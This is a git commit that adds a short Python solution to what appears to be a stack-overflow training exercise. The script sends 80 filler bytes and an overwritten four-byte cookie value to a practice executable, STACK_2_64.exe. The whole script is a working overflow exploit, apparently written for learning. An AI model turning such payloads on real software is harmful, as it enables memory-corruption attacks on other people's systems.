283b450115f7a5a9d90d36bb95d52b44b9cd2c78
Solid <65661347+solidcls@users.noreply.github.com>
2024-08-13 20:52:42 -0300

    Add files via upload

---
+++ 01_Stacks/solutions/STACK_2_64.py
@@ -0,0 +1,15 @@
+import sys
+from subprocess import Popen, PIPE
+
+buffer = b"A" * 80
+cookie = b"\x05\x03\x02\x01"
+
+payload = buffer + cookie
+
+p1 = Popen("STACK_2_64.exe", stdin=PIPE)
+print ("PID: %s" % hex(p1.pid))
+print ("Enter para continuar")
+
+p1.communicate(payload)
+p1.wait()
+input()
